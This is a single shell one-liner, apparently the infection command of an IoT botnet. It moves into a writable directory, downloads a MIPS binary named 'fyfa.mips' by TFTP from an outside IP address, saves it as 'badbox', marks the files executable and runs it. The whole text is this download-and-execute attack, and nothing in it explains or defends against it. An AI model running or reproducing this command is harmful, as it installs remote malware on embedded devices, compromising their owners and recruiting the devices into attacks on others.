cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 173.0.63.114 -c get fyfa.mips;cat fyfa.mips >badbox;chmod +x *;./badbox
